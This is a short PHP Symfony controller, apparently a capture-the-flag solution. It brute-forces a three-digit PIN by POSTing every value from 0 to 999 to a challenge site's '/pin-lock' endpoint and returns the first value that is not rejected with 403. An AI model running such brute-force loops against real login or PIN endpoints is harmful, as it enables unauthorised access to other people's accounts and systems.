<?php

namespace App\Controller;

use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Contracts\HttpClient\HttpClientInterface;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

class BruteController extends AbstractController
{
    #[Route('/', name: 'force_brute')]
    public function tryIt(HttpClientInterface $client)
    {
        for($i=0; $i<=999; $i++) {
            $response = $client->request(
                'POST',
                'https://wild-capture-the-flag.phprover.wilders.dev/pin-lock',
                [
                    'body' => ['pin' => $i]
                ]
            );
            $statusCode = $response->getStatusCode();

            if ($statusCode != 403) {
                return new Response($i);
            }
        }
    }
}
